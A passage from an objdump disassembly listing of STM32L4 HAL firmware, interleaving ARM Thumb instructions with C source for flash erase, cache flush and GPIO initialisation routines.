 80018f4:	4b38      	ldr	r3, [pc, #224]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 80018f6:	681b      	ldr	r3, [r3, #0]
 80018f8:	4a37      	ldr	r2, [pc, #220]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 80018fa:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80018fe:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 8001900:	4b34      	ldr	r3, [pc, #208]	; (80019d4 <HAL_FLASHEx_Erase+0x12c>)
 8001902:	2203      	movs	r2, #3
 8001904:	771a      	strb	r2, [r3, #28]
 8001906:	e016      	b.n	8001936 <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 8001908:	4b32      	ldr	r3, [pc, #200]	; (80019d4 <HAL_FLASHEx_Erase+0x12c>)
 800190a:	2201      	movs	r2, #1
 800190c:	771a      	strb	r2, [r3, #28]
 800190e:	e012      	b.n	8001936 <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001910:	4b31      	ldr	r3, [pc, #196]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 8001912:	681b      	ldr	r3, [r3, #0]
 8001914:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001918:	2b00      	cmp	r3, #0
 800191a:	d009      	beq.n	8001930 <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 800191c:	4b2e      	ldr	r3, [pc, #184]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 800191e:	681b      	ldr	r3, [r3, #0]
 8001920:	4a2d      	ldr	r2, [pc, #180]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 8001922:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001926:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001928:	4b2a      	ldr	r3, [pc, #168]	; (80019d4 <HAL_FLASHEx_Erase+0x12c>)
 800192a:	2202      	movs	r2, #2
 800192c:	771a      	strb	r2, [r3, #28]
 800192e:	e002      	b.n	8001936 <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001930:	4b28      	ldr	r3, [pc, #160]	; (80019d4 <HAL_FLASHEx_Erase+0x12c>)
 8001932:	2200      	movs	r2, #0
 8001934:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 8001936:	687b      	ldr	r3, [r7, #4]
 8001938:	681b      	ldr	r3, [r3, #0]
 800193a:	2b01      	cmp	r3, #1
 800193c:	d111      	bne.n	8001962 <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 800193e:	687b      	ldr	r3, [r7, #4]
 8001940:	685b      	ldr	r3, [r3, #4]
 8001942:	4618      	mov	r0, r3
 8001944:	f000 f84a 	bl	80019dc <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001948:	f24c 3050 	movw	r0, #50000	; 0xc350
 800194c:	f7ff fef8 	bl	8001740 <FLASH_WaitForLastOperation>
 8001950:	4603      	mov	r3, r0
 8001952:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 8001954:	4b20      	ldr	r3, [pc, #128]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 8001956:	695b      	ldr	r3, [r3, #20]
 8001958:	4a1f      	ldr	r2, [pc, #124]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 800195a:	f023 0304 	bic.w	r3, r3, #4
 800195e:	6153      	str	r3, [r2, #20]
 8001960:	e02d      	b.n	80019be <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 8001962:	683b      	ldr	r3, [r7, #0]
 8001964:	f04f 32ff 	mov.w	r2, #4294967295
 8001968:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 800196a:	687b      	ldr	r3, [r7, #4]
 800196c:	689b      	ldr	r3, [r3, #8]
 800196e:	60bb      	str	r3, [r7, #8]
 8001970:	e01d      	b.n	80019ae <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 8001972:	687b      	ldr	r3, [r7, #4]
 8001974:	685b      	ldr	r3, [r3, #4]
 8001976:	4619      	mov	r1, r3
 8001978:	68b8      	ldr	r0, [r7, #8]
 800197a:	f000 f84d 	bl	8001a18 <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800197e:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001982:	f7ff fedd 	bl	8001740 <FLASH_WaitForLastOperation>
 8001986:	4603      	mov	r3, r0
 8001988:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 800198a:	4b13      	ldr	r3, [pc, #76]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 800198c:	695b      	ldr	r3, [r3, #20]
 800198e:	4a12      	ldr	r2, [pc, #72]	; (80019d8 <HAL_FLASHEx_Erase+0x130>)
 8001990:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 8001994:	f023 0302 	bic.w	r3, r3, #2
 8001998:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 800199a:	7bfb      	ldrb	r3, [r7, #15]
 800199c:	2b00      	cmp	r3, #0
 800199e:	d003      	beq.n	80019a8 <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 80019a0:	683b      	ldr	r3, [r7, #0]
 80019a2:	68ba      	ldr	r2, [r7, #8]
 80019a4:	601a      	str	r2, [r3, #0]
          break;
 80019a6:	e00a      	b.n	80019be <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 80019a8:	68bb      	ldr	r3, [r7, #8]
 80019aa:	3301      	adds	r3, #1
 80019ac:	60bb      	str	r3, [r7, #8]
 80019ae:	687b      	ldr	r3, [r7, #4]
 80019b0:	689a      	ldr	r2, [r3, #8]
 80019b2:	687b      	ldr	r3, [r7, #4]
 80019b4:	68db      	ldr	r3, [r3, #12]
 80019b6:	4413      	add	r3, r2
 80019b8:	68ba      	ldr	r2, [r7, #8]
 80019ba:	429a      	cmp	r2, r3
 80019bc:	d3d9      	bcc.n	8001972 <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80019be:	f000 f84f 	bl	8001a60 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80019c2:	4b04      	ldr	r3, [pc, #16]	; (80019d4 <HAL_FLASHEx_Erase+0x12c>)
 80019c4:	2200      	movs	r2, #0
 80019c6:	701a      	strb	r2, [r3, #0]

  return status;
 80019c8:	7bfb      	ldrb	r3, [r7, #15]
}
 80019ca:	4618      	mov	r0, r3
 80019cc:	3710      	adds	r7, #16
 80019ce:	46bd      	mov	sp, r7
 80019d0:	bd80      	pop	{r7, pc}
 80019d2:	bf00      	nop
 80019d4:	2000000c 	.word	0x2000000c
 80019d8:	40022000 	.word	0x40022000

080019dc <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 80019dc:	b480      	push	{r7}
 80019de:	b083      	sub	sp, #12
 80019e0:	af00      	add	r7, sp, #0
 80019e2:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 80019e4:	687b      	ldr	r3, [r7, #4]
 80019e6:	f003 0301 	and.w	r3, r3, #1
 80019ea:	2b00      	cmp	r3, #0
 80019ec:	d005      	beq.n	80019fa <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 80019ee:	4b09      	ldr	r3, [pc, #36]	; (8001a14 <FLASH_MassErase+0x38>)
 80019f0:	695b      	ldr	r3, [r3, #20]
 80019f2:	4a08      	ldr	r2, [pc, #32]	; (8001a14 <FLASH_MassErase+0x38>)
 80019f4:	f043 0304 	orr.w	r3, r3, #4
 80019f8:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 80019fa:	4b06      	ldr	r3, [pc, #24]	; (8001a14 <FLASH_MassErase+0x38>)
 80019fc:	695b      	ldr	r3, [r3, #20]
 80019fe:	4a05      	ldr	r2, [pc, #20]	; (8001a14 <FLASH_MassErase+0x38>)
 8001a00:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001a04:	6153      	str	r3, [r2, #20]
}
 8001a06:	bf00      	nop
 8001a08:	370c      	adds	r7, #12
 8001a0a:	46bd      	mov	sp, r7
 8001a0c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001a10:	4770      	bx	lr
 8001a12:	bf00      	nop
 8001a14:	40022000 	.word	0x40022000

08001a18 <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 8001a18:	b480      	push	{r7}
 8001a1a:	b083      	sub	sp, #12
 8001a1c:	af00      	add	r7, sp, #0
 8001a1e:	6078      	str	r0, [r7, #4]
 8001a20:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 8001a22:	4b0e      	ldr	r3, [pc, #56]	; (8001a5c <FLASH_PageErase+0x44>)
 8001a24:	695b      	ldr	r3, [r3, #20]
 8001a26:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 8001a2a:	687b      	ldr	r3, [r7, #4]
 8001a2c:	00db      	lsls	r3, r3, #3
 8001a2e:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 8001a32:	490a      	ldr	r1, [pc, #40]	; (8001a5c <FLASH_PageErase+0x44>)
 8001a34:	4313      	orrs	r3, r2
 8001a36:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 8001a38:	4b08      	ldr	r3, [pc, #32]	; (8001a5c <FLASH_PageErase+0x44>)
 8001a3a:	695b      	ldr	r3, [r3, #20]
 8001a3c:	4a07      	ldr	r2, [pc, #28]	; (8001a5c <FLASH_PageErase+0x44>)
 8001a3e:	f043 0302 	orr.w	r3, r3, #2
 8001a42:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001a44:	4b05      	ldr	r3, [pc, #20]	; (8001a5c <FLASH_PageErase+0x44>)
 8001a46:	695b      	ldr	r3, [r3, #20]
 8001a48:	4a04      	ldr	r2, [pc, #16]	; (8001a5c <FLASH_PageErase+0x44>)
 8001a4a:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001a4e:	6153      	str	r3, [r2, #20]
}
 8001a50:	bf00      	nop
 8001a52:	370c      	adds	r7, #12
 8001a54:	46bd      	mov	sp, r7
 8001a56:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001a5a:	4770      	bx	lr
 8001a5c:	40022000 	.word	0x40022000

08001a60 <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 8001a60:	b480      	push	{r7}
 8001a62:	b083      	sub	sp, #12
 8001a64:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 8001a66:	4b21      	ldr	r3, [pc, #132]	; (8001aec <FLASH_FlushCaches+0x8c>)
 8001a68:	7f1b      	ldrb	r3, [r3, #28]
 8001a6a:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 8001a6c:	79fb      	ldrb	r3, [r7, #7]
 8001a6e:	2b01      	cmp	r3, #1
 8001a70:	d002      	beq.n	8001a78 <FLASH_FlushCaches+0x18>
 8001a72:	79fb      	ldrb	r3, [r7, #7]
 8001a74:	2b03      	cmp	r3, #3
 8001a76:	d117      	bne.n	8001aa8 <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 8001a78:	4b1d      	ldr	r3, [pc, #116]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001a7a:	681b      	ldr	r3, [r3, #0]
 8001a7c:	4a1c      	ldr	r2, [pc, #112]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001a7e:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 8001a82:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 8001a84:	4b1a      	ldr	r3, [pc, #104]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001a86:	681b      	ldr	r3, [r3, #0]
 8001a88:	4a19      	ldr	r2, [pc, #100]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001a8a:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 8001a8e:	6013      	str	r3, [r2, #0]
 8001a90:	4b17      	ldr	r3, [pc, #92]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001a92:	681b      	ldr	r3, [r3, #0]
 8001a94:	4a16      	ldr	r2, [pc, #88]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001a96:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 8001a9a:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 8001a9c:	4b14      	ldr	r3, [pc, #80]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001a9e:	681b      	ldr	r3, [r3, #0]
 8001aa0:	4a13      	ldr	r2, [pc, #76]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001aa2:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8001aa6:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 8001aa8:	79fb      	ldrb	r3, [r7, #7]
 8001aaa:	2b02      	cmp	r3, #2
 8001aac:	d002      	beq.n	8001ab4 <FLASH_FlushCaches+0x54>
 8001aae:	79fb      	ldrb	r3, [r7, #7]
 8001ab0:	2b03      	cmp	r3, #3
 8001ab2:	d111      	bne.n	8001ad8 <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 8001ab4:	4b0e      	ldr	r3, [pc, #56]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001ab6:	681b      	ldr	r3, [r3, #0]
 8001ab8:	4a0d      	ldr	r2, [pc, #52]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001aba:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8001abe:	6013      	str	r3, [r2, #0]
 8001ac0:	4b0b      	ldr	r3, [pc, #44]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001ac2:	681b      	ldr	r3, [r3, #0]
 8001ac4:	4a0a      	ldr	r2, [pc, #40]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001ac6:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 8001aca:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 8001acc:	4b08      	ldr	r3, [pc, #32]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001ace:	681b      	ldr	r3, [r3, #0]
 8001ad0:	4a07      	ldr	r2, [pc, #28]	; (8001af0 <FLASH_FlushCaches+0x90>)
 8001ad2:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8001ad6:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001ad8:	4b04      	ldr	r3, [pc, #16]	; (8001aec <FLASH_FlushCaches+0x8c>)
 8001ada:	2200      	movs	r2, #0
 8001adc:	771a      	strb	r2, [r3, #28]
}
 8001ade:	bf00      	nop
 8001ae0:	370c      	adds	r7, #12
 8001ae2:	46bd      	mov	sp, r7
 8001ae4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001ae8:	4770      	bx	lr
 8001aea:	bf00      	nop
 8001aec:	2000000c 	.word	0x2000000c
 8001af0:	40022000 	.word	0x40022000

08001af4 <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 8001af4:	b480      	push	{r7}
 8001af6:	b087      	sub	sp, #28
 8001af8:	af00      	add	r7, sp, #0
 8001afa:	6078      	str	r0, [r7, #4]
 8001afc:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001afe:	2300      	movs	r3, #0
 8001b00:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001b02:	e148      	b.n	8001d96 <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 8001b04:	683b      	ldr	r3, [r7, #0]
 8001b06:	681a      	ldr	r2, [r3, #0]
 8001b08:	2101      	movs	r1, #1
 8001b0a:	697b      	ldr	r3, [r7, #20]
 8001b0c:	fa01 f303 	lsl.w	r3, r1, r3
 8001b10:	4013      	ands	r3, r2
 8001b12:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 8001b14:	68fb      	ldr	r3, [r7, #12]
 8001b16:	2b00      	cmp	r3, #0
 8001b18:	f000 813a 	beq.w	8001d90 <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 8001b1c:	683b      	ldr	r3, [r7, #0]
 8001b1e:	685b      	ldr	r3, [r3, #4]
 8001b20:	f003 0303 	and.w	r3, r3, #3
 8001b24:	2b01      	cmp	r3, #1
 8001b26:	d005      	beq.n	8001b34 <HAL_GPIO_Init+0x40>
 8001b28:	683b      	ldr	r3, [r7, #0]
 8001b2a:	685b      	ldr	r3, [r3, #4]
 8001b2c:	f003 0303 	and.w	r3, r3, #3
 8001b30:	2b02      	cmp	r3, #2
 8001b32:	d130      	bne.n	8001b96 <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 8001b34:	687b      	ldr	r3, [r7, #4]
 8001b36:	689b      	ldr	r3, [r3, #8]
 8001b38:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 8001b3a:	697b      	ldr	r3, [r7, #20]
 8001b3c:	005b      	lsls	r3, r3, #1
 8001b3e:	2203      	movs	r2, #3
 8001b40:	fa02 f303 	lsl.w	r3, r2, r3
 8001b44:	43db      	mvns	r3, r3
 8001b46:	693a      	ldr	r2, [r7, #16]
 8001b48:	4013      	ands	r3, r2
 8001b4a:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 8001b4c:	683b      	ldr	r3, [r7, #0]
 8001b4e:	68da      	ldr	r2, [r3, #12]
 8001b50:	697b      	ldr	r3, [r7, #20]
 8001b52:	005b      	lsls	r3, r3, #1
 8001b54:	fa02 f303 	lsl.w	r3, r2, r3
 8001b58:	693a      	ldr	r2, [r7, #16]
 8001b5a:	4313      	orrs	r3, r2
 8001b5c:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 8001b5e:	687b      	ldr	r3, [r7, #4]
 8001b60:	693a      	ldr	r2, [r7, #16]
 8001b62:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 8001b64:	687b      	ldr	r3, [r7, #4]
 8001b66:	685b      	ldr	r3, [r3, #4]
 8001b68:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 8001b6a:	2201      	movs	r2, #1
 8001b6c:	697b      	ldr	r3, [r7, #20]
 8001b6e:	fa02 f303 	lsl.w	r3, r2, r3
 8001b72:	43db      	mvns	r3, r3
 8001b74:	693a      	ldr	r2, [r7, #16]
 8001b76:	4013      	ands	r3, r2
 8001b78:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 8001b7a:	683b      	ldr	r3, [r7, #0]
 8001b7c:	685b      	ldr	r3, [r3, #4]
 8001b7e:	091b      	lsrs	r3, r3, #4
 8001b80:	f003 0201 	and.w	r2, r3, #1
 8001b84:	697b      	ldr	r3, [r7, #20]
 8001b86:	fa02 f303 	lsl.w	r3, r2, r3
 8001b8a:	693a      	ldr	r2, [r7, #16]
 8001b8c:	4313      	orrs	r3, r2
 8001b8e:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 8001b90:	687b      	ldr	r3, [r7, #4]
 8001b92:	693a      	ldr	r2, [r7, #16]
 8001b94:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 8001b96:	683b      	ldr	r3, [r7, #0]
 8001b98:	685b      	ldr	r3, [r3, #4]
 8001b9a:	f003 0303 	and.w	r3, r3, #3
 8001b9e:	2b03      	cmp	r3, #3
 8001ba0:	d017      	beq.n	8001bd2 <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 8001ba2:	687b      	ldr	r3, [r7, #4]
 8001ba4:	68db      	ldr	r3, [r3, #12]
 8001ba6:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 8001ba8:	697b      	ldr	r3, [r7, #20]
 8001baa:	005b      	lsls	r3, r3, #1
 8001bac:	2203      	movs	r2, #3
 8001bae:	fa02 f303 	lsl.w	r3, r2, r3
 8001bb2:	43db      	mvns	r3, r3
 8001bb4:	693a      	ldr	r2, [r7, #16]
 8001bb6:	4013      	ands	r3, r2
 8001bb8:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 8001bba:	683b      	ldr	r3, [r7, #0]
 8001bbc:	689a      	ldr	r2, [r3, #8]
 8001bbe:	697b      	ldr	r3, [r7, #20]
 8001bc0:	005b      	lsls	r3, r3, #1
 8001bc2:	fa02 f303 	lsl.w	r3, r2, r3
 8001bc6:	693a      	ldr	r2, [r7, #16]
 8001bc8:	4313      	orrs	r3, r2
 8001bca:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 8001bcc:	687b      	ldr	r3, [r7, #4]
 8001bce:	693a      	ldr	r2, [r7, #16]
 8001bd0:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 8001bd2:	683b      	ldr	r3, [r7, #0]
 8001bd4:	685b      	ldr	r3, [r3, #4]
 8001bd6:	f003 0303 	and.w	r3, r3, #3
 8001bda:	2b02      	cmp	r3, #2
 8001bdc:	d123      	bne.n	8001c26 <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 8001bde:	697b      	ldr	r3, [r7, #20]
 8001be0:	08da      	lsrs	r2, r3, #3
 8001be2:	687b      	ldr	r3, [r7, #4]
 8001be4:	3208      	adds	r2, #8
 8001be6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8001bea:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 8001bec:	697b      	ldr	r3, [r7, #20]
 8001bee:	f003 0307 	and.w	r3, r3, #7
 8001bf2:	009b      	lsls	r3, r3, #2
 8001bf4:	220f      	movs	r2, #15
 8001bf6:	fa02 f303 	lsl.w	r3, r2, r3
 8001bfa:	43db      	mvns	r3, r3
 8001bfc:	693a      	ldr	r2, [r7, #16]
 8001bfe:	4013      	ands	r3, r2
 8001c00:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 8001c02:	683b      	ldr	r3, [r7, #0]
 8001c04:	691a      	ldr	r2, [r3, #16]
 8001c06:	697b      	ldr	r3, [r7, #20]
 8001c08:	f003 0307 	and.w	r3, r3, #7
 8001c0c:	009b      	lsls	r3, r3, #2
 8001c0e:	fa02 f303 	lsl.w	r3, r2, r3
 8001c12:	693a      	ldr	r2, [r7, #16]
 8001c14:	4313      	orrs	r3, r2
 8001c16:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001c18:	697b      	ldr	r3, [r7, #20]
 8001c1a:	08da      	lsrs	r2, r3, #3
 8001c1c:	687b      	ldr	r3, [r7, #4]
 8001c1e:	3208      	adds	r2, #8
 8001c20:	6939      	ldr	r1, [r7, #16]
 8001c22:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001c26:	687b      	ldr	r3, [r7, #4]
 8001c28:	681b      	ldr	r3, [r3, #0]
 8001c2a:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001c2c:	697b      	ldr	r3, [r7, #20]
 8001c2e:	005b      	lsls	r3, r3, #1
 8001c30:	2203      	movs	r2, #3
 8001c32:	fa02 f303 	lsl.w	r3, r2, r3
 8001c36:	43db      	mvns	r3, r3
 8001c38:	693a      	ldr	r2, [r7, #16]
 8001c3a:	4013      	ands	r3, r2
 8001c3c:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001c3e:	683b      	ldr	r3, [r7, #0]
 8001c40:	685b      	ldr	r3, [r3, #4]
 8001c42:	f003 0203 	and.w	r2, r3, #3
 8001c46:	697b      	ldr	r3, [r7, #20]
 8001c48:	005b      	lsls	r3, r3, #1
 8001c4a:	fa02 f303 	lsl.w	r3, r2, r3
 8001c4e:	693a      	ldr	r2, [r7, #16]
 8001c50:	4313      	orrs	r3, r2
 8001c52:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001c54:	687b      	ldr	r3, [r7, #4]
 8001c56:	693a      	ldr	r2, [r7, #16]
 8001c58:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001c5a:	683b      	ldr	r3, [r7, #0]
 8001c5c:	685b      	ldr	r3, [r3, #4]
 8001c5e:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001c62:	2b00      	cmp	r3, #0
 8001c64:	f000 8094 	beq.w	8001d90 <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001c68:	4b52      	ldr	r3, [pc, #328]	; (8001db4 <HAL_GPIO_Init+0x2c0>)
 8001c6a:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001c6c:	4a51      	ldr	r2, [pc, #324]	; (8001db4 <HAL_GPIO_Init+0x2c0>)
